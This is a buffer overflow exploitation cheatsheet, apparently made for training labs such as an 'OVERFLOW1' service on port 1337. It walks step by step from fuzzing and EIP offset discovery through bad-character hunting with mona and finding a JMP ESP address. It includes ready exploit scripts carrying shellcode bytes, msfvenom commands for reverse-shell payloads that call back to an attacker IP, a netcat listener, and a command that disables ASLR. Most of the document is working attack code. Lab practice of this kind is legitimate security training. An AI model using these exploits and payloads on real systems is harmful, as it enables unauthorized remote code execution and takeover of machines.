# BOF Cheatsheet

### fuzzer.py

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "MACHINE_IP"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

### exploit.py

<pre class="language-python"><code class="lang-python">#!/usr/bin/env python3

<strong>import socket
</strong>
ip = "MACHINE_IP"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
</code></pre>

### exploit\_bytes.py

```python
offset = 1308
overflow = "A" * offset
retn = "\xba\x11\x80\x14"
padding = "\x90" * 16
payload="\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x5f\x35\xae\x3d\x83\xee\xfc\xe2\xf4 \xa3\xdd\x2c\x3d\x5f\x35\xce\xb4\xba\x04\x6e\x59\xd4\x65\x9e\xb6\x0d\x39\x25\x6f\x4b\xbe\xdc\x15\x50\x82\ xe4\x1b\x6e\xca\x02\x01\x3e\x49\xac\x11\x7f\xf4\x61\x30\x5e\xf2\x4c\xcf\x0d\x62\x25\x6f\x4f\xbe\xe4\x01\x d4\x79\xbf\x45\xbc\x7d\xaf\xec\x0e\xbe\xf7\x1d\x5e\xe6\x25\x74\x47\xd6\x94\x74\xd4\x01\x25\x3c\x89\x04\x5 1\x91\x9e\xfa\xa3\x3c\x98\x0d\x4e\x48\xa9\x36\xd3\xc5\x64\x48\x8a\x48\xbb\x6d\x25\x65\x7b\x34\x7d\x5b\xd4 \x39\xe5\xb6\x07\x29\xaf\xee\xd4\x31\x25\x3c\x8f\xbc\xea\x19\x7b\x6e\xf5\x5c\x06\x6f\xff\xc2\xbf\x6a\xf1\ x67\xd4\x27\x45\xb0\x02\x5d\x9d\x0f\x5f\x35\xc6\x4a\x2c\x07\xf1\x69\x37\x79\xd9\x1b\x58\xca\x7b\x85\xcf\x 34\xae\x3d\x76\xf1\xfa\x6d\x37\x1c\x2e\x56\x5f\xca\x7b\x6d\x0f\x65\xfe\x7d\x0f\x75\xfe\x55\xb5\x3a\x71\xd d\xa0\xe0\x39\x57\x5a\x5d\x6e\x95\x28\xb0\xc6\x3f\x5f\x34\x15\xb4\xb9\x5f\xbe\x6b\x08\x5d\x37\x98\x2b\x54 \x51\xe8\xda\xf5\xda\x31\xa0\x7b\xa6\x48\xb3\x5d\x5e\x88\xfd\x63\x51\xe8\x37\x56\xc3\x59\x5f\xbc\x4d\x6a\ x08\x62\x9f\xcb\x35\x27\xf7\x6b\xbd\xc8\xc8\xfa\x1b\x11\x92\x3c\x5e\xb8\xea\x19\x4f\xf3\xae\x79\x0b\x65\x f8\x6b\x09\x73\xf8\x73\x09\x63\xfd\x6b\x37\x4c\x62\x02\xd9\xca\x7b\xb4\xbf\x7b\xf8\x7b\xa0\x05\xc6\x35\xd 8\x28\xce\xc2\x8a\x8e\x5e\x88\xfd\x63\xc6\x9b\xca\x88\x33\xc2\x8a\x09\xa8\x41\x55\xb5\x55\xdd\x2a\x30\x15\x7a\x4c\x47\xc1\x57\x5f\x66\x51\xe8"
buffer = overflow + retn + padding + payload
with open("exploit_bytes.txt","wb") as f:
    f.write(bytes(buffer + "\n", "latin-1"))

```

### \x01 to \xff

```
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

### 1. Pattern Create

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 800
```

### 2. Finding offset where EIP overwrite happens

```bash
msf-pattern_offset -l 800 -q 42306142
```

{% hint style="info" %}
-l: the length of the original pattern&#x20;

-q: specify the bytes found in EIP
{% endhint %}

### 3. Find bad chars&#x20;

#### Manual method:

```python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
```

```bash
python2 -c "print ''.join([chr(i) for i in range(1,256)])" > exploit.txt
```

{% hint style="info" %}
Above script will generate exploit.txt that contains the raw bytes from \x01 to \xff (By default \x00 is bad char)

Use `bvi` to edit the raw hex bytes!
{% endhint %}

* Overflow the buffer to gain control of EIP register and append the entire \x01 to \xff bytearray to the shellcode.
* Use Immunity Debugger to run the program --> click on ESP register --> `Follow in Dump`
* Check the stack values against the original bytearray to figure out the bad characters.
* After finding a bad char, note it down and remove it from the bytearray shellcode and repeat the process again until the \xff appears.

#### Mona method:

```
!mona config -set workingfolder c:\Users\admin\Desktop
```

```
!mona bytearray -b "\x00"
```

```
!mona compare -f c:\Users\admin\Desktop\bytearray.bin -a <ESP addr>
```

{% hint style="info" %}
After finding a bad char, remove it and send the remaining payload again. Find the bad chars one by one (since bad chars may affect the chars adjacent to it).
{% endhint %}

### 4. Finding a jump point

```bash
!mona jmp -r esp -cpb "\x00\x0a"
```

{% hint style="info" %}
Update the -cpb option with all the badchars you identified (including \x00)
{% endhint %}

* Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.

### 5. Generate payloads

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
```

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

{% hint style="info" %}
* -f c: To select C-formatted shellcode
* -e x86/shikata\_ga\_nai: use of the polymorphic encode shikata\_ga\_nai (It can’t be helped)
* -b “\x00\x0a..”: specifies the bad chars
{% endhint %}

{% hint style="info" %}
* For linux --> -p linux/x86/shell\_reverse\_tcp
{% endhint %}

### 6. Prepend NOPs

```
padding = "\x90" * 16
```

{% hint style="info" %}
Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself.
{% endhint %}

### 7. Obtain shell

```
netcat -lvp 4444
```

### Troubleshooting

Some bad chars only appear when they are adjacent to certain chars. Hence, it is wise to check the hex values of the created shellcode against the values present in the stack (ESP --> Follow Dump)

#### To check hex values of created shellcode

```bash
xxd -g 1 -c 8 exploit_bytes.txt
```

{% hint style="info" %}
-g: number of octets per group

-c: format octets per line
{% endhint %}

#### Find Function Address

```bash
objdump -D execution-flow-windows.exe | grep <func_name>
```

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Need to convert the address to little endian format (00401530 --> \x30\x15\x40\x00)
{% endhint %}

#### Disable ASLR for Linux

```bash
echo 0 | tee /proc/sys/kernel/randomize_va_space
```
